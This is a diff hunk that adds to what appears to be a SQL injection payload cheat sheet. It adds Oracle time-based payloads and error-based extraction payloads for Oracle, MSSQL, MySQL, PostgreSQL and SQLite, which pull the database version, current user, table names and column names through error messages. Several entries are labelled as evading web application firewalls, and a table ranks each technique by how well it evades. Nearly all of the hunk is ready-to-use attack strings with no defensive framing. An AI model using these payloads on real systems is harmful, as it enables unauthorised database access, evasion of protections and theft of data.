@@ -147,7 +147,79 @@ admin'--
 
 -- SQLite
 ' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))))==1--
+
+-- Oracle (time-based)
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
 ```
+
+**Oracle Error-Based (data extraction via ORA errors):**
+```sql
+-- Classic — UTL_INADDR (heavily WAF-blocked)
+' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version))--
+
+-- XMLType — moderately WAF-blocked
+' AND 1=XMLType((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'))--
+
+-- DBMS_UTILITY.SQLID_TO_SQLHASH — WAF-evasive, low detection rate
+-- Embeds subquery inside a legitimate Oracle admin function
+-- || is Oracle string concat (not + like MSSQL)
+-- ~ delimiters isolate extracted value in error output
+1'||DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')||'~')||'
+1'||DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT user FROM dual)||'~')||'
+1'||DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT table_name FROM all_tables WHERE rownum=1)||'~')||'
+1'||DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT column_name FROM all_tab_columns WHERE rownum=1)||'~')||'
+
+-- How it works:
+-- 1. Subquery executes → returns data string
+-- 2. Wrapped with ~ delimiters → '~Oracle Database 19c...~'
+-- 3. Passed to SQLID_TO_SQLHASH → returns NUMBER
+-- 4. NUMBER concatenated (||) back into string context → ORA-01722 or leaks in response
+-- Oracle confirms: v$version, all_tables, all_tab_columns, dual
+```
+
+**Universal Error-Based Pattern — DB Fingerprinting + Extraction:**
+```sql
+-- Pattern: close string → obscure function carrying subquery → reopen string
+-- ~ delimiters isolate extracted value in error message
+-- Send one per DB type — whichever errors = your DB engine
+
+-- Oracle (|| concat, DBMS_UTILITY.SQLID_TO_SQLHASH → NUMBER type mismatch → ORA-01722)
+1'||DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')||'~')||'
+1'||DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT user FROM dual)||'~')||'
+1'||DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT table_name FROM all_tables WHERE rownum=1)||'~')||'
+
+-- MSSQL (+ concat, CONVERT(int,...) → "Conversion failed" error with value)
+1'+CONVERT(int,(SELECT '~'+@@version+'~'))+'
+1'+CONVERT(int,(SELECT '~'+db_name()+'~'))+'
+1'+CONVERT(int,(SELECT '~'+SYSTEM_USER+'~'))+'
+1'+CONVERT(int,(SELECT '~'+(SELECT TOP 1 table_name FROM information_schema.tables)+'~'))+'
+
+-- MySQL (EXTRACTVALUE → XPATH error with value, medium WAF detection)
+1' AND EXTRACTVALUE(1,concat(0x7e,(SELECT version()),0x7e))--
+1' AND EXTRACTVALUE(1,concat(0x7e,(SELECT database()),0x7e))--
+1' AND EXTRACTVALUE(1,concat(0x7e,(SELECT user()),0x7e))--
+
+-- MySQL (ST_LatFromGeoHash → WAF-evasive alternative)
+1'||(SELECT ST_LatFromGeoHash(version()))--
+
+-- PostgreSQL (|| concat, CAST to integer → "invalid input syntax" error with value)
+1'||CAST((SELECT '~'||version()||'~') AS integer)||'
+1'||CAST((SELECT '~'||current_database()||'~') AS integer)||'
+1'||CAST((SELECT '~'||current_user||'~') AS integer)||'
+
+-- SQLite (no error-based functions — use randomblob for time-based confirmation)
+1'||randomblob(500000000)||'
+```
+
+| DB | Concat | Function | Error type | WAF evasion |
+|----|--------|----------|-----------|-------------|
+| Oracle | `\|\|` | `DBMS_UTILITY.SQLID_TO_SQLHASH()` | ORA-01722 invalid number | High |
+| MSSQL | `+` | `CONVERT(int,...)` | Conversion failed | Medium |
+| MySQL | `\|\|` | `EXTRACTVALUE()` | XPATH syntax error | Medium |
+| MySQL | `\|\|` | `ST_LatFromGeoHash()` | Geometry error | High |
+| PostgreSQL | `\|\|` | `CAST(... AS integer)` | Invalid input syntax | Medium |
+| SQLite | `\|\|` | `randomblob()` | Time-based only | High |
 
 **UNION-Based (enumerate columns first):**
 ```sql
